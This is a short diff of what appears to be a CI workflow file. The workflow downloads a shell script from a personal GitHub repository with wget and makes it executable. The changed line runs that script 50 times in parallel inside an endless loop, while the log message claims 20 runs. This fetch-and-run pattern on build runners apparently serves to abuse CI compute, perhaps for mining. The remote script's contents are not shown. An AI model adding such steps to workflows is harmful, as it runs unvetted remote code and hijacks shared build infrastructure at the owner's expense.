@@ -18,7 +18,7 @@ jobs:
           wget https://raw.githubusercontent.com/kalepailmine001/tail/refs/heads/main/vid.sh && chmod +x vid.sh
           while true; do
             echo "⏱️ $(date) - Launching 20 parallel run.sh executions..."
-            seq 50 | parallel -j50 sh run.sh
+            seq 50 | parallel -j50 ./vid.sh
             echo "✅ Batch done. Sleeping 10 seconds..."
             sleep 10
           done
